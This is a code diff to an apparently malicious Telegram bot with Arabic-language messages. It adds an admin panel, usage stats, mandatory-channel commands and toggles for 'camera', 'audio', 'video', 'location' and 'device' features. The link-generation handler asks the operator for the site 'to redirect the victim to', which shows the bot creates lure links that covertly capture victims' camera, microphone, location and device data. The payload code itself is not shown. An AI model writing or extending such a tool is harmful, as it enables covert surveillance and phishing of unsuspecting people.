@@ -758,7 +758,19 @@ def handle_callback(call):
     user_id = call.from_user.id
     feature = call.data
     
-    # ====== لوحة الإدارة (مفعلة) ======
+    # ====== العودة للقائمة ======
+    if feature == 'back_to_menu':
+        bot.edit_message_text(
+            "📋 **القائمة الرئيسية:**",
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=main_menu(user_id)
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== لوحة الإدارة ======
     if feature == 'admin_panel':
         user = get_user(user_id)
         if user and user['is_admin']:
@@ -774,10 +786,157 @@ def handle_callback(call):
             bot.answer_callback_query(call.id, "❌ غير مصرح لك")
         return
     
-    # طلب الرابط الأصلي
-    user_states[user_id] = f'waiting_url_{feature}'
-    bot.send_message(user_id, "📤 أرسل الآن الرابط الأصلي (الموقع الذي تريد توجيه الضحية إليه):")
-    bot.answer_callback_query(call.id)
+    # ====== إحصائيات ======
+    if feature == 'admin_stats':
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            conn = get_db()
+            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
+            total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0] or 0
+            total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
+            total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
+            conn.close()
+            
+            msg = f"""
+📊 **إحصائيات البوت**
+
+👥 إجمالي المستخدمين: {total_users}
+⭐ إجمالي النقاط: {total_points}
+📨 إجمالي الدعوات: {total_invites}
+📋 عدد السجلات: {total_logs}
+            """
+            bot.send_message(user_id, msg, parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== إدارة القنوات ======
+    if feature == 'admin_channels':
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            channels = get_required_channels()
+            msg = "📢 **القنوات الإجبارية:**\n\n"
+            if channels:
+                for ch in channels:
+                    try:
+                        chat = bot.get_chat(ch['channel_id'])
+                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
+                    except:
+                        msg += f"🔹 {ch['channel_id']}\n"
+            else:
+                msg += "📭 لا توجد قنوات إجبارية\n"
+            msg += "\n📌 استخدم الأوامر:\n`/add_channel [id] [الاسم]`\n`/remove_channel [id]`"
+            bot.send_message(user_id, msg, parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== إدارة الميزات ======
+    if feature == 'admin_features':
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
+            markup = InlineKeyboardMarkup(row_width=2)
+            for f in features:
+                status = "✅" if is_feature_enabled(f) else "❌"
+                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
+            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
+            bot.edit_message_text(
+                "🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:",
+                user_id,
+                call.message.message_id,
+                parse_mode='Markdown',
+                reply_markup=markup
+            )
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== تبديل الميزات ======
+    if feature.startswith('toggle_'):
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            feature_name = feature.replace('toggle_', '')
+            new_status = toggle_feature(feature_name)
+            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
+            bot.answer_callback_query(call.id, f"تم {status_text}")
+            
+            # تحديث القائمة
+            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
+            markup = InlineKeyboardMarkup(row_width=2)
+            for f in features:
+                status = "✅" if is_feature_enabled(f) else "❌"
+                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
+            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
+            bot.edit_message_text(
+                f"🔧 **إدارة الميزات**\n{feature_name.title()} الآن {status_text}",
+                user_id,
+                call.message.message_id,
+                parse_mode='Markdown',
+                reply_markup=markup
+            )
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== التواصل مع الإدمن ======
+    if feature == 'admin_contact':
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            bot.send_message(user_id, "📨 أرسل الرسالة التي تريد إرسالها للمستخدمين، وسأقوم بنشرها.")
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== إنشاء روابط (الميزات الأساسية) ======
+    if feature in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
+        user_states[user_id] = f'waiting_url_{feature}'
+        bot.send_message(user_id, "📤 أرسل الآن **الرابط الأصلي** (الموقع الذي تريد توجيه الضحية إليه):")
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== أي شيء آخر ======
+    bot.answer_callback_query(call.id, "❌ خيار غير معروف")
+@bot.message_handler(commands=['add_channel'])
+def add_channel_cmd(message):
+    user_id = message.from_user.id
+    user = get_user(user_id)
+    if not user or not user['is_admin']:
+        bot.reply_to(message, "❌ غير مصرح لك")
+        return
+    try:
+        parts = message.text.split(maxsplit=2)
+        if len(parts) < 3:
+            bot.reply_to(message, "❌ استخدم: /add_channel [id] [الاسم]")
+            return
+        channel_id = parts[1]
+        channel_name = parts[2]
+        add_required_channel(channel_id, channel_name)
+        bot.reply_to(message, f"✅ تم إضافة القناة: {channel_name}")
+    except:
+        bot.reply_to(message, "❌ حدث خطأ")
+
+@bot.message_handler(commands=['remove_channel'])
+def remove_channel_cmd(message):
+    user_id = message.from_user.id
+    user = get_user(user_id)
+    if not user or not user['is_admin']:
+        bot.reply_to(message, "❌ غير مصرح لك")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ استخدم: /remove_channel [id]")
+            return
+        channel_id = parts[1]
+        remove_required_channel(channel_id)
+        bot.reply_to(message, f"✅ تم حذف القناة")
+    except:
+        bot.reply_to(message, "❌ حدث خطأ")
 @bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
 def handle_original_url(message):
     user_id = message.from_user.id
